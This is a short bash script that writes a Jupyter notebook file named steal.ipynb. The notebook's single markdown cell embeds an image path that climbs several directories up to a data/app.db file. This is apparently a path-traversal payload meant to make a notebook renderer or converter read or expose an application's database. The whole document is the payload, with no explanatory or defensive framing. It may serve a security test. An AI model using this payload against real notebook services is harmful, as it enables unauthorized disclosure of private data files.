#!/bin/bash
cat > /tmp/steal.ipynb << 'NOTEBOOK'
{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": ["![](../../../../data/app.db)"]
    }
  ],
  "metadata": {
    "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
    "language_info": {"name": "python", "version": "3.11.0"}
  },
  "nbformat": 4,
  "nbformat_minor": 4
}
NOTEBOOK
